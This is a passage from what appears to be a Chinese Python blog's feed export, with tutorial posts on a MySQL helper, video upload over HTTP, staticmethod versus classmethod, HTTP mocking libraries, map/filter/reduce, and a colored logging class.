self.countBySql(**kwargs),</span><br><span class="line">        Const.DELETE_BY_ATTR: lambda: self.deleteByAttr(**kwargs),</span><br><span class="line">        Const.EXIST: lambda: self.exist(**kwargs),</span><br><span class="line">        Const.FIND_ALL_BY_ATTR: lambda: self.findAllByAttr(**kwargs),</span><br><span class="line">        Const.INSERT: lambda: self.insert(**kwargs),</span><br><span class="line">        Const.FIND_BY_ATTR: lambda: self.findByAttr(**kwargs),</span><br><span class="line">        Const.UPDATE_BY_ATTR: lambda: self.updateByAttr(**kwargs),</span><br><span class="line">        Const.FIND_BY_SQL: lambda: self.findBySql(**kwargs)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return sqlOperate[key]()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    mysqlet = MySQLet(host=&quot;127.0.0.1&quot;, user=&quot;root&quot;, password=&quot;&quot;, charset=&quot;utf8&quot;, database=&quot;userinfo&quot;, port=3306)</span><br><span class="line">    # 根据字段统计count, join&gt;&gt;AND,OR,可以不传，默认为AND</span><br><span class="line">    print(mysqlet.findKeySql(Const.COUNT, table=&quot;info&quot;, params=&#123;&quot;id&quot;: &quot;11&quot;, &quot;name&quot;: &quot;666&quot;&#125;, join=&quot;OR&quot;))</span><br><span class="line">    # 自定义sql语句统计count</span><br><span class="line">    print(mysqlet.findKeySql(Const.COUNT_BY_SQL, sql=&quot;select * from info&quot;, params=&#123;&quot;name&quot;: &quot;666&quot;&#125;, join=&quot;AND&quot;))</span><br><span class="line">    #插入数据</span><br><span class="line">    print(mysqlet.findKeySql(Const.INSERT, table=&quot;info&quot;, data=&#123;&quot;name&quot;:&quot;333&quot;, &quot;pwd&quot;: &quot;111&quot;&#125;))</span><br><span class="line">    #根据字段删除,不传params参数，就是删除全部</span><br><span class="line">    print(mysqlet.findKeySql(Const.DELETE_BY_ATTR, table=&quot;info&quot;, params=&#123;&quot;id&quot;: 20&#125;))</span><br><span class="line">    # 查找是否存在该记录,不传params参数，就是查找全部.join同上</span><br><span class="line">    print(mysqlet.findKeySql(Const.EXIST, table=&quot;info&quot;, params=&#123;&quot;id&quot;: 180&#125;,join=&#x27;AND&#x27;))</span><br><span class="line">    #根据字段查找多条记录，whole不传就查一条记录，criteria里面可以传where,group by,having,order by,limt,offset</span><br><span class="line">    print(mysqlet.findKeySql(Const.FIND_ALL_BY_ATTR, table=&quot;info&quot;, criteria= &#123;&quot;where&quot;: &quot;name=333&quot;&#125;, whole=True))</span><br><span class="line">    # 根据字段查一条记录，和上面的查多条记录参数基本一样，少了个whole参数</span><br><span class="line">    print(mysqlet.findKeySql(Const.FIND_BY_ATTR, table=&quot;info&quot;, criteria= &#123;&quot;where&quot;: &quot;name=333&quot;&#125;))</span><br><span class="line">    # 根据字段更新数据库中的记录，join可以传AND,OR,不传默认取AND</span><br><span class="line">    print(mysqlet.findKeySql(Const.UPDATE_BY_ATTR, table=&quot;info&quot;,data=&#123;&quot;name&quot;: &quot;-09&quot;&#125;, params=&#123;&quot;id&quot;: 18, &quot;name&quot;: &quot;333&quot;&#125;, join=&#x27;AND&#x27;))</span><br><span class="line">    # 根据自定义sql语句查询记录，limit:0表示所有记录，join：AND|OR.不传取AND</span><br><span class="line">    print(mysqlet.findKeySql(Const.FIND_BY_SQL, sql=&quot;select * from info&quot;, params=&#123;&quot;name&quot;: &quot;333&quot;, &quot;id&quot;: 18&#125;, limit=0))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python上传视频</title>
    <url>/aposts/b031d180/</url>
    <content><![CDATA[<ul>
<li><p>http简单封装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ConfigHttp:</span><br><span class="line">    def __init__(self, host, port,headers):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.headers = headers</span><br><span class="line">    # 封装HTTP GET请求方法</span><br><span class="line">    def get(self, url, params=None):</span><br><span class="line">        # params = urllib.parse.urlencode(params)</span><br><span class="line">        url = &quot;http://&quot;+self.host+&quot;:&quot;+self.port+url</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url, params=params, headers=self.headers)</span><br><span class="line">            r.encoding = &#x27;UTF-8&#x27;</span><br><span class="line">            dcit_r = json.loads(r.text)</span><br><span class="line">            print(json.loads(r.text))</span><br><span class="line">            return dcit_r</span><br><span class="line">        except Exception:</span><br><span class="line">            print(&#x27;no json data returned&#x27;)</span><br><span class="line">            return &#123;&#125;</span><br><span class="line">    # 封装HTTP POST请求方法,支持上传图片</span><br><span class="line">    def post(self, url, data=None, files=None):</span><br><span class="line">        # data = eval(data)</span><br><span class="line">        url = &#x27;http://&#x27; + self.host + &#x27;:&#x27; + str(self.port)+url</span><br><span class="line">        r =requests.post(url, files=files, data=data)</span><br><span class="line">        json_response = r.text</span><br><span class="line">        print(json_response)</span><br><span class="line">        return json_response</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传视频</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def upload():</span><br><span class="line">    getToken()</span><br><span class="line">    f = &#123;&#x27;Filename&#x27;:&#x27;视频上传测试1&#x27;,</span><br><span class="line">             &#x27;Filedata&#x27;:(&#x27;1.mp4&#x27;,open(u&#x27;D:/app/dgm/1.mp4&#x27;,&#x27;rb&#x27;),&#x27;application/octet-stream&#x27;),</span><br><span class="line">             &#x27;Upload&#x27;:&#x27;视频上传测试2&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    up = baseHttp.ConfigHttp(host=UPLOAD_HOST,port=UPLOAD_PORT,headers=HEADER)</span><br><span class="line">    url = &quot;/api/upload?do=upload&amp;type=4&amp;op=video&amp;sid=&quot;+CODE +&quot;&amp;token=&quot; + TOKEN</span><br><span class="line">    res = up.post(url=url, files=f）</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python中staticmethod和classmethod区别</title>
    <url>/aposts/834cb703/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class MyClass(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.ids = &quot;001&quot;</span><br><span class="line"></span><br><span class="line">    def t1(self, path=&quot;&quot;):</span><br><span class="line">        print(&quot;这个是实例化方法&quot;)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def get_result(path):</span><br><span class="line">        print(&quot;这个是静态方法&quot;)</span><br><span class="line">        MyClass().t1()  # 显示调用类的实例化方法</span><br><span class="line">        print(MyClass().ids)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def get_test1(cls, path):</span><br><span class="line">        print(&quot;这个是类方法&quot;)</span><br><span class="line">        cls().t1()  # 调用类的实例化方法</span><br><span class="line">        print(cls().ids)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MyClass().t1(&quot;调用实例化方法&quot;)</span><br><span class="line">MyClass.get_result(&quot;调用静态方法&quot;)</span><br><span class="line">MyClass.get_test1(&quot;调用类方法&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>类中一般包含三种方法<ul>
<li>实例化方法（<code>MyClass().t1()</code>）</li>
<li>静态方法（<code>staticmethod</code>）</li>
<li>类方法（<code>classmethod</code>）</li>
</ul>
</li>
<li><code>classmethod</code>（类方法），第一个参数必须是<code>cls</code>，这个<code>cls</code>指向了类本身，因此可以直接用<code>cls</code>实例化来访问类的内部方法或者属性。<ul>
<li><code>cls().t1()</code></li>
</ul>
</li>
<li><code>staticmethod</code>(静态方法)，如果要调用类的内部方法，只能显示地引用类<code>MyClass</code>，这对继承来说可不是一件好事情<ul>
<li><code>MyClass().t1() </code></li>
</ul>
</li>
</ul>
<p><strong>因此</strong></p>
<ul>
<li>只要不调用类的内部方法和属性，<code>classmethod</code>和<code>staticmethod</code>都可以使用</li>
<li>若要调用类的内部方法和属性，推荐使用<code>classmethod</code></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python中常用的mock介绍</title>
    <url>/aposts/43e69bf0/</url>
    <content><![CDATA[ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Count():</span><br><span class="line">    def add(self):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<ul>
<li>用mock测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from unittest import mock</span><br><span class="line">import unittest</span><br><span class="line">from modular import Count</span><br><span class="line">class TestCount(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def test_add(self):</span><br><span class="line">        count = Count()</span><br><span class="line">        count.add = mock.Mock(return_value=13)</span><br><span class="line">        result = count.add(8,5)</span><br><span class="line">        self.assertEqual(result,13)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        unittest.main() </span><br></pre></td></tr></table></figure>


<h1 id="HTTPretty"><a href="#HTTPretty" class="headerlink" title="HTTPretty"></a>HTTPretty</h1><p>Python 的 HTTP 请求 mock 工具,不支持py3</p>
<ul>
<li>安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install HTTPretty</span><br></pre></td></tr></table></figure>

<ul>
<li>使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import httpretty</span><br><span class="line"></span><br><span class="line">def test_one():</span><br><span class="line">    httpretty.enable()  # enable HTTPretty so that it will monkey patch the socket module</span><br><span class="line">    httpretty.register_uri(httpretty.GET, &quot;http://yipit.com/&quot;,</span><br><span class="line">                           body=&quot;Find the best daily deals&quot;)</span><br><span class="line"></span><br><span class="line">    response = requests.get(&#x27;http://yipit.com&#x27;)</span><br><span class="line"></span><br><span class="line">    assert response.text == &quot;Find the best daily deals&quot;</span><br><span class="line"></span><br><span class="line">    httpretty.disable()  # disable afterwards, so that you will have no problems in code that uses that socket module</span><br><span class="line">    httpretty.reset()    # reset H</span><br></pre></td></tr></table></figure>

<ul>
<li>post</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from sure import expect</span><br><span class="line">import httpretty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@httpretty.activate</span><br><span class="line">def test_yipit_api_integration():</span><br><span class="line">    httpretty.register_uri(httpretty.POST, &quot;http://api.yipit.com/foo/&quot;,</span><br><span class="line">                           body=&#x27;&#123;&quot;repositories&quot;: [&quot;HTTPretty&quot;, &quot;lettuce&quot;]&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    response = requests.post(&#x27;http://api.yipit.com/foo&#x27;,</span><br><span class="line">                            &#x27;&#123;&quot;username&quot;: &quot;gabrielfalcao&quot;&#125;&#x27;,</span><br><span class="line">                            headers=&#123;</span><br><span class="line">                                &#x27;content-type&#x27;: &#x27;text/json&#x27;,</span><br><span class="line">                            &#125;)</span><br><span class="line"></span><br><span class="line">    expect(response.text).to.equal(&#x27;&#123;&quot;repositories&quot;: [&quot;HTTPretty&quot;, &quot;lettuce&quot;]&#125;&#x27;)</span><br><span class="line">    expect(httpretty.last_request().method).to.equal(&quot;POST&quot;)</span><br><span class="line">    expect(httpretty.last_request().headers[&#x27;content-type&#x27;]).to.equal(&#x27;text/json&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以使用正则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@httpretty.activate</span><br><span class="line">def test_httpretty_should_allow_registering_regexes():</span><br><span class="line">    u&quot;HTTPretty should allow registering regexes&quot;</span><br><span class="line"></span><br><span class="line">    httpretty.register_uri(</span><br><span class="line">        httpretty.GET,</span><br><span class="line">        re.compile(&quot;api.yipit.com/v2/deal;brand=(\w+)&quot;),</span><br><span class="line">        body=&quot;Found brand&quot;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    response = requests.get(&#x27;https://api.yipit.com/v2/deal;brand=GAP&#x27;)</span><br><span class="line">    expect(response.text).to.equal(&#x27;Found brand&#x27;)</span><br><span class="line">    expect(httpretty.last_request().method).to.equal(&#x27;GET&#x27;)</span><br><span class="line">    expect(httpretty.last_request().path).to.equal(&#x27;/v1/deal;brand=GAP&#x27;)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><a href="https://github.com/gabrielfalcao/HTTPretty">查看HTTPretty源码</a></p>
<h1 id="httmock"><a href="#httmock" class="headerlink" title="httmock"></a>httmock</h1><p>针对 Python 2.6+ 和 3.2+ 生成 伪造请求的库。</p>
<ul>
<li><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install httmock</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from httmock import urlmatch, HTTMock</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">@urlmatch(netloc=r&#x27;(.*\.)?google\.com$&#x27;)</span><br><span class="line">def google_mock(url, request):</span><br><span class="line">    return &#x27;Feeling lucky, punk?&#x27;</span><br><span class="line"></span><br><span class="line">with HTTMock(google_mock):</span><br><span class="line">    r = requests.get(&#x27;http://google.com/&#x27;)</span><br><span class="line">print r.content  # &#x27;Feeling lucky, punk?&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from httmock import all_requests, HTTMock</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">@all_requests</span><br><span class="line">def response_content(url, request):</span><br><span class="line">    return &#123;&#x27;status_code&#x27;: 200,</span><br><span class="line">            &#x27;content&#x27;: &#x27;Oh hai&#x27;&#125;</span><br><span class="line"></span><br><span class="line">with HTTMock(response_content):</span><br><span class="line">    r = requests.get(&#x27;https://foo_bar&#x27;)</span><br><span class="line"></span><br><span class="line">print r.status_code</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>

<ul>
<li>cookie</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from httmock import all_requests, response, HTTMock</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">@all_requests</span><br><span class="line">def response_content(url, request):</span><br><span class="line">    headers = &#123;&#x27;content-type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">               &#x27;Set-Cookie&#x27;: &#x27;foo=bar;&#x27;&#125;</span><br><span class="line">    content = &#123;&#x27;message&#x27;: &#x27;API rate limit exceeded&#x27;&#125;</span><br><span class="line">    return response(403, content, headers, None, 5, request)</span><br><span class="line"></span><br><span class="line">with HTTMock(response_content):</span><br><span class="line">    r = requests.get(&#x27;https://api.github.com/users/whatever&#x27;)</span><br><span class="line"></span><br><span class="line">print r.json().get(&#x27;message&#x27;)</span><br><span class="line">print r.cookies[&#x27;foo&#x27;]</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/patrys/httmock">查看httmock源码</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python中的map、filter、reduce函数</title>
    <url>/aposts/900bcde7/</url>
    <content><![CDATA[<h1 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h1><ul>
<li><p>map函数会根据提供的函数对指定序列做映射。</p>
</li>
<li><p>map函数的定义：map(function, sequence[, sequence, …]) -&gt; list</p>
<ul>
<li>通过定义可以看到，这个函数的第一个参数是一个函数，剩下的参数是一个或多个序列，返回值是一个集合。<br>function可以理解为是一个一对一或多对一函数，map的作用是以参数序列中的每一个元素调用function函数，返回包含每次function函数返回值的list。</li>
</ul>
<p><strong>lambda 结合的例子</strong></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map(lambda x: x ** 2, [1, 2, 3, 4, 5])</span><br><span class="line">返回结果为：</span><br><span class="line">[1, 4, 9, 16, 25]</span><br></pre></td></tr></table></figure>

<p>  <strong>单参数例子</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add100(x):</span><br><span class="line">     return x+100</span><br><span class="line"></span><br><span class="line"> hh = [11,22,33]</span><br><span class="line"> map(add100,hh)</span><br><span class="line"> [111, 122, 133]</span><br></pre></td></tr></table></figure>

<ul>
<li>** list参数的例子**<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def abc(a, b, c):</span><br><span class="line">...     return a*10000 + b*100 + c</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; list1 = [11,22,33]</span><br><span class="line">&gt;&gt;&gt; list2 = [44,55,66]</span><br><span class="line">&gt;&gt;&gt; list3 = [77,88,99]</span><br><span class="line">&gt;&gt;&gt; map(abc,list1,list2,list3)</span><br><span class="line">[114477, 225588, 336699]</span><br></pre></td></tr></table></figure></li>
<li><strong>function为None的例子</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; list1 = [11,22,33]</span><br><span class="line">&gt;&gt;&gt; map(None,list1)</span><br><span class="line">[11, 22, 33]</span><br><span class="line">&gt;&gt;&gt; list1 = [11,22,33]</span><br><span class="line">&gt;&gt;&gt; list2 = [44,55,66]</span><br><span class="line">&gt;&gt;&gt; list3 = [77,88,99]</span><br><span class="line">&gt;&gt;&gt; map(None,list1,list2,list3)</span><br><span class="line">[(11, 44, 77), (22, 55, 88), (33, 66, 99)]</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="filter函数"><a href="#filter函数" class="headerlink" title="filter函数"></a>filter函数</h1><ul>
<li>filter函数会对指定序列执行过滤操作。</li>
<li>filter函数的定义：filter(function or None, sequence) -&gt; list, tuple, or string<ul>
<li><p>function是一个谓词函数，接受一个参数，返回布尔值True或False。</p>
</li>
<li><p>filter函数会对序列参数sequence中的每个元素调用function函数，最后返回的结果包含调用结果为True的元素。返回值的类型和参数sequence的类型相同</p>
</li>
<li><p><strong>返回序列中的所有奇数</strong></p>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_even(x):</span><br><span class="line">      return x &amp; 1 != 0</span><br><span class="line">filter(is_even, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])</span><br><span class="line">返回结果为：</span><br><span class="line">[1, 3, 5, 7, 9]</span><br></pre></td></tr></table></figure>

<ul>
<li>如果function参数为None，返回结果和sequence参数相同。</li>
</ul>
<h1 id="reduce函数"><a href="#reduce函数" class="headerlink" title="reduce函数"></a>reduce函数</h1><ul>
<li>reduce函数，reduce函数会对参数序列中元素进行累积。</li>
<li>py3以后使用，必须导入 from functools import reduce </li>
<li>reduce函数的定义：reduce(function, sequence[, initial]) -&gt; value<ul>
<li><p>function参数是一个有两个参数的函数，reduce依次从sequence中取一个元素，和上一次调用function的结果做参数再次调用function。<br>第一次调用function时，如果提供initial参数，会以sequence中的第一个元素和initial作为参数调用function，否则会以序列sequence中的前两个元素做参数调用function。</p>
</li>
<li><p>累加例子</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def myadd(x,y):  </span><br><span class="line">        return x+y  </span><br><span class="line">    sum=reduce(myadd,(1,2,3,4,5,6,7))  </span><br><span class="line">    print(sum)  </span><br><span class="line">    #结果就是输出1+2+3+4+5+6+7的结果即28</span><br></pre></td></tr></table></figure>

<ul>
<li>lambda 结合的例子</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reduce(lambda x, y: x + y, [2, 3, 4, 5, 6], 1)</span><br><span class="line">结果为21(  (((((1+2)+3)+4)+5)+6)  )</span><br><span class="line">reduce(lambda x, y: x + y, [2, 3, 4, 5, 6])</span><br><span class="line">结果为20</span><br></pre></td></tr></table></figure>
<ul>
<li>注意function函数不能为None。</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python之logging</title>
    <url>/aposts/3fc2b160/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">------------------------------------</span><br><span class="line"># @FileName    :handle_log.py</span><br><span class="line"># @Time        :2020/8/31 19:59</span><br><span class="line"># @Author      :xieyuanzuo</span><br><span class="line"># @description :</span><br><span class="line">------------------------------------</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import colorlog</span><br><span class="line">from logging.handlers import RotatingFileHandler</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">cur_path = os.path.dirname(os.path.realpath(__file__))  # 当前项目路径</span><br><span class="line">log_path = os.path.join(os.path.dirname(cur_path), &#x27;leetcode&#x27;, &#x27;logs&#x27;)  # log_path为存放日志的路径</span><br><span class="line">if not os.path.exists(log_path): os.mkdir(log_path)  # 若不存在logs文件夹，则自动创建</span><br><span class="line"></span><br><span class="line">log_colors_config = &#123;</span><br><span class="line">    # 终端输出日志颜色配置</span><br><span class="line">    &#x27;DEBUG&#x27;: &#x27;white&#x27;,</span><br><span class="line">    &#x27;INFO&#x27;: &#x27;cyan&#x27;,</span><br><span class="line">    &#x27;WARNING&#x27;: &#x27;yellow&#x27;,</span><br><span class="line">    &#x27;ERROR&#x27;: &#x27;red&#x27;,</span><br><span class="line">    &#x27;CRITICAL&#x27;: &#x27;bold_red&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">default_formats = &#123;</span><br><span class="line">    # 终端输出格式</span><br><span class="line">    &#x27;color_format&#x27;: &#x27;%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s: %(message)s&#x27;,</span><br><span class="line">    # 日志输出格式</span><br><span class="line">    &#x27;log_format&#x27;: &#x27;%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s: %(message)s&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class HandleLog:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    先创建日志记录器（logging.getLogger），然后再设置日志级别（logger.setLevel），</span><br><span class="line">    接着再创建日志文件，也就是日志保存的地方（logging.FileHandler），然后再设置日志格式（logging.Formatter），</span><br><span class="line">    最后再将日志处理程序记录到记录器（addHandler）</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.__now_time = datetime.now().strftime(&#x27;%Y-%m-%d&#x27;)  # 当前日期格式化</span><br><span class="line">        self.__all_log_path = os.path.join(log_path, self.__now_time + &quot;-all&quot; + &quot;.log&quot;)  # 收集所有日志信息文件</span><br><span class="line">        self.__error_log_path = os.path.join(log_path, self.__now_time + &quot;-error&quot; + &quot;.log&quot;)  # 收集错误日志信息文件</span><br><span class="line">        self.__logger = logging.getLogger()  # 创建日志记录器</span><br><span class="line">        self.__logger.setLevel(logging.DEBUG)  # 设置默认日志记录器记录级别</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __init_logger_handler(log_path):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        创建日志记录器handler，用于收集日志</span><br><span class="line">        :param log_path: 日志文件路径</span><br><span class="line">        :return: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 写入文件，如果文件超过1M大小时，切割日志文件，仅保留3个文件</span><br><span class="line">        logger_handler = RotatingFileHandler(filename=log_path, maxBytes=1 * 1024 * 1024, backupCount=3, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">        return logger_handler</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __init_console_handle():</span><br><span class="line">        &quot;&quot;&quot;创建终端日志记录器handler，用于输出到控制台&quot;&quot;&quot;</span><br><span class="line">        console_handle = colorlog.StreamHandler()</span><br><span class="line">        return console_handle</span><br><span class="line"></span><br><span class="line">    def __set_log_handler(self, logger_handler, level=logging.DEBUG):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置handler级别并添加到logger收集器</span><br><span class="line">        :param logger_handler: 日志记录器</span><br><span class="line">        :param level: 日志记录器级别</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        logger_handler.setLevel(level=level)</span><br><span class="line">        self.__logger.addHandler(logger_handler)</span><br><span class="line"></span><br><span class="line">    def __set_color_handle(self, console_handle):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置handler级别并添加到终端logger收集器</span><br><span class="line">        :param console_handle: 终端日志记录器</span><br><span class="line">        :param level: 日志记录器级别</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        console_handle.setLevel(logging.DEBUG)</span><br><span class="line">        self.__logger.addHandler(console_handle)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __set_color_formatter(console_handle, color_config):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置输出格式-控制台</span><br><span class="line">        :param console_handle: 终端日志记录器</span><br><span class="line">        :param color_config: 控制台打印颜色配置信息</span><br><span class="line">        :return:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        formatter = colorlog.ColoredFormatter(default_formats[&quot;color_format&quot;], log_colors=color_config)</span><br><span class="line">        console_handle.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __set_log_formatter(file_handler):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置日志输出格式-日志文件</span><br><span class="line">        :param file_handler: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        formatter = logging.Formatter(default_formats[&quot;log_format&quot;], datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">        file_handler.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __close_handler(file_handler):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        关闭handler</span><br><span class="line">        :param file_handler: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        file_handler.close()</span><br><span class="line"></span><br><span class="line">    def __console(self, level, message):</span><br><span class="line">        &quot;&quot;&quot;构造日志收集器&quot;&quot;&quot;</span><br><span class="line">        all_logger_handler = self.__init_logger_handler(self.__all_log_path)  # 创建日志文件</span><br><span class="line">        error_logger_handler = self.__init_logger_handler(self.__error_log_path)</span><br><span class="line">        console_handle = self.__init_console_handle()</span><br><span class="line"></span><br><span class="line">        self.__set_log_formatter(all_logger_handler)  # 设置日志格式</span><br><span class="line">        self.__set_log_formatter(error_logger_handler)</span><br><span class="line">        self.__set_color_formatter(console_handle, log_colors_config)</span><br><span class="line"></span><br><span class="line">        self.__set_log_handler(all_logger_handler)  # 设置handler级别并添加到logger收集器</span><br><span class="line">        self.__set_log_handler(error_logger_handler, level=logging.ERROR)</span><br><span class="line">        self.__set_color_handle(console_handle)</span><br><span class="line"></span><br><span class="line">        if level == &#x27;info&#x27;:</span><br><span class="line">            self.__logger.info(message)</span><br><span class="line">        elif level == &#x27;debug&#x27;:</span><br><span class="line">            self.__logger.debug(message)</span><br><span class="line">        elif level == &#x27;warning&#x27;:</span><br><span class="line">            self.__logger.warning(message)</span><br><span class="line">        elif level == &#x27;error&#x27;:</span><br><span class="line">            self.__logger.error(message)</span><br><span class="line">        elif level == &#x27;critical&#x27;:</span><br><span class="line">            self.__logger.critical(message)</span><br><span class="line"></span><br><span class="line">        self.__logger.removeHandler(all_logger_handler)  # 避免日志输出重复问题</span><br><span class="line">        self.__logger.removeHandler(error_logger_handler)</span><br><span class="line">        self.__logger.removeHandler(console_handle)</span><br><span class="line"></span><br><span class="line">        self.__close_handler(all_logger_handler)  # 关闭handler</span><br><span class="line">        self.__close_handler(error_logger_handler)</span><br><span class="line"></span><br><span class="line">    def debug(self, message):</span><br><span class="line">        self.__console(&#x27;debug&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def info(self, message):</span><br><span class="line">        self.__console(&#x27;info&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def warning(self, message):</span><br><span class="line">        self.__console(&#x27;warning&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def error(self, message):</span><br><span class="line">        self.__console(&#x27;error&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def critical(self, message):</span><br><span class="line">        self.__console(&#x27;critical&#x27;, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = HandleLog()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    for i in range(5):</span><br><span class="line">        log.info(&quot;这是日志信息&quot;)</span><br><span class="line">        log.debug(&quot;这是debug信息&quot;)</span><br><span class="line">        log.warning(&quot;这是警告信息&quot;)</span><br><span class="line">        log.error(&quot;这是错误日志信息&quot;)</span><br><span class="line">        log.critical(&quot;这是严重级别信息&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><ul>
<li>在Logs文件夹下生成了一个为全部日志文件，一个为错误日志文件</li>
</ul>
<p><img src="/aposts/3fc2b160/image-20220802192813131.png" alt="image-20220802192813131"></p>
<ul>
<li>日志文件的生成核心代码如下，可根据需求修改</li>
</ul>
